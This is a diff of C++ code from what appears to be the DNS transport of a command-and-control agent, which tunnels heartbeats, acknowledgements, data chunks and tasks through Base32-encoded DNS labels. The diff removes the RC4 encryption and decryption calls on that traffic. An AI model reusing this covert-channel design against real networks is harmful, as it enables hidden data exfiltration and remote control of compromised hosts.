@@ -1139,7 +1139,6 @@ void ConnectorDNS::SendHeartbeat()
     ULONG hbNonce = this->functions->GetTickCount() ^ (this->seq * 7919);
     BYTE hbData[kAckDataSize];
     BuildAckData(hbData, this->downAckOffset, hbNonce, this->downTaskNonce);
-    EncryptRC4(hbData, kAckDataSize, this->encryptKey, 16);
 
     CHAR hbLabel[32] = { 0 };
     DnsCodec::Base32Encode(hbData, kAckDataSize, hbLabel, sizeof(hbLabel));
@@ -1193,7 +1192,6 @@ void ConnectorDNS::SendAck()
     ULONG ackNonce = this->functions->GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
     BYTE ackData[kAckDataSize];
     BuildAckData(ackData, this->downAckOffset, ackNonce, this->downTaskNonce);
-    EncryptRC4(ackData, kAckDataSize, this->encryptKey, 16);
 
     CHAR ackLabel[32] = { 0 };
     DnsCodec::Base32Encode(ackData, kAckDataSize, ackLabel, sizeof(ackLabel));
@@ -1355,8 +1353,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             WriteBE32(frame + kMetaSize + 4, sendOffset);
             memcpy(frame + kHeaderSize, data + sendOffset, chunk);
 
-            EncryptRC4(frame, frameSize, this->encryptKey, 16);
-
             memset(dataLabel, 0, sizeof(dataLabel));
             if (!DnsCodec::BuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                 MemFreeLocal((LPVOID*)&frame, frameSize);
@@ -1510,7 +1506,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     BYTE reqData[kReqDataSize];
     WriteBE32(reqData, reqOffset);
     WriteBE32(reqData + 4, nonce);
-    EncryptRC4(reqData, kReqDataSize, this->encryptKey, 16);
 
     CHAR reqLabel[24];
     memset(reqLabel, 0, sizeof(reqLabel));
@@ -1540,8 +1535,6 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             ResetDownload();
             return;
         }
-
-        DecryptRC4(binBuf, binLen, this->encryptKey, 16);
 
         const ULONG headerSize = 8;
         if (binLen > (int)headerSize) {
